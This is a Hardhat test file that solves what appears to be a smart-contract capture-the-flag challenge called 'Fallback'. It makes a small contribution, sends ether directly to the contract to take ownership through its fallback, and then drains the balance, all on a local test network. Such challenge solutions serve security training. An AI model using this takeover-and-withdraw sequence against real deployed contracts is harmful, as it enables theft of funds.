import { TransactionResponse } from "@ethersproject/providers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_NAME = "Fallback";

describe(CONTRACT_NAME, () => {
  let _owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  let tx: TransactionResponse;

  beforeEach(async () => {
    [_owner, attacker] = await ethers.getSigners();

    const factory = await ethers.getContractFactory(CONTRACT_NAME);
    contract = await factory.deploy();
    await contract.deployed();

    contract = contract.connect(attacker);
  });

  it("Solves the challenge 01", async () => {
    tx = await contract.contribute({ value: 1 });
    await tx.wait();

    tx = await attacker.sendTransaction({
      to: contract.address,
      value: 1,
    });

    tx = await contract.withdraw();
    await tx.wait();

    const balance = await ethers.provider.getBalance(contract.address);
    const owner = await contract.owner();

    expect(balance).to.eq(0);
    expect(owner).to.eq(attacker.address);
  });
});
